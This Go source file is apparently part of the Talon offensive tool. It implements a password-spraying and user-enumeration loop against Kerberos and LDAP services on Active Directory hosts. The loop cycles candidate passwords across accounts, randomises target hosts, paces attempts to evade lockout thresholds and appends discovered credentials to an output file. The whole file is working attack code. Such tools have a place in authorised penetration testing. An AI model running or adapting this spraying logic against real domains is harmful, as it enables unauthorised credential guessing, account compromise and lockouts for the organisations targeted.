package spray

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"

	"github.com/ZerkerEOD/Talon/v4/internal/auth"
	"github.com/ZerkerEOD/Talon/v4/internal/config"
)

// ObservedLocked returns the cumulative number of distinct accounts observed locked.
func (s *State) ObservedLocked() int { return s.observedLocked }

// setup builds the right Authenticator for a service.
func setup(service, host, domain, user, pass string, mode auth.EnumMode) auth.Authenticator {
	switch service {
	case "KERB":
		return auth.KERB{Host: host, Domain: domain, User: user, Password: pass, Mode: mode}
	case "LDAP":
		return auth.LDAP{Host: host, Domain: domain, User: user, Password: pass}
	}
	return nil
}

// writeResult appends a line to the output file with owner-only permissions
// (the file holds discovered credentials).
func writeResult(path, line string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] could not open %s: %v\n", path, err)
		return
	}
	defer f.Close()
	if _, err := f.WriteString(line + "\n"); err != nil {
		fmt.Fprintf(os.Stderr, "[!] could not write to %s: %v\n", path, err)
	}
}

func windowSleep(opt *config.Options) {
	color.Set(color.FgYellow, color.Bold)
	fmt.Printf("\n[*] Hit pacing limit — sleeping for %v minutes...\n", opt.Lockout)
	resume := time.Now().Add(time.Duration(opt.Lockout * float64(time.Minute)))
	fmt.Printf("    Will resume at %s\n", resume.Format("01-02-2006 15:04:05"))
	color.Unset()
	time.Sleep(time.Duration(opt.Lockout * float64(time.Minute)))
}

// Run executes the attack/enumeration. passwords has length 1 for single-password
// and enumeration modes; mode selects spray vs safe/aggressive enum.
func Run(opt *config.Options, st *State, hosts, services, passwords []string, mode auth.EnumMode) {
	domain := strings.ToUpper(opt.Domain)
	reader := bufio.NewReader(os.Stdin)
	spraying := mode == auth.EnumOff && len(passwords) > 1

	maxPasses := int(opt.Attempts)
	if maxPasses < 1 {
		maxPasses = 1
	}
	passesThisWindow := 0

	for p := 0; p < len(passwords); p++ {
		if spraying && passesThisWindow >= maxPasses {
			windowSleep(opt)
			st.ResetWindow()
			passesThisWindow = 0
		}

		pwd := passwords[p]
		if spraying {
			fmt.Print(time.Now().Format("01-02-2006 15:04:05: "))
			fmt.Printf("Using password: %s\n", pwd)
		}

		x := 0
		for _, key := range st.Order() {
			if st.IsDone(key) {
				continue
			}
			credentialed := mode != auth.EnumSafe
			if credentialed && st.ShouldSkipThisWindow(key) {
				continue
			}

			username := st.Display(key)
			host := hosts[rand.Intn(len(hosts))]
			svc := services[x]
			x = (x + 1) % len(services)

			time.Sleep(time.Duration(opt.Sleep * float64(time.Second)))
			a := setup(svc, host, domain, username, pwd, mode)
			if a == nil {
				continue
			}
			r := a.Login()

			switch r.Outcome {
			case auth.OutcomeNetworkError:
				config.Debugf("%v\n", r.Err)
				fmt.Printf("[*] Network error contacting %s (%s). Continue? [y/n]: ", host, svc)
				text, _ := reader.ReadString('\n')
				if !strings.Contains(strings.ToLower(text), "y") {
					fmt.Println("[*] Shutting down")
					return
				}
				continue
			case auth.OutcomeTimeSkew:
				fmt.Println(r.Display())
				fmt.Println("[*] Clock skew between you and the KDC is too great — shutting down")
				return
			}

			fmt.Println(r.Display())
			st.Record(r)
			if opt.OutFile != "" {
				writeResult(opt.OutFile, r.FileLine())
			}
			if opt.Verbose {
				fmt.Println(st.LiveTally())
			}

			if credentialed && st.DetectorTripped() {
				fmt.Printf("[*] Lockout detector tripped (%d distinct account lockout(s) observed). Continue? [y/n]: ", st.ObservedLocked())
				text, _ := reader.ReadString('\n')
				if strings.Contains(strings.ToLower(text), "y") {
					st.AcknowledgeContinue()
				} else {
					fmt.Println("[*] Shutting down")
					return
				}
			}

			if st.AllDone() {
				fmt.Println("[*] All users resolved (locked / valid / exhausted) — finishing")
				return
			}
		}

		if spraying {
			passesThisWindow++
		}
	}
}
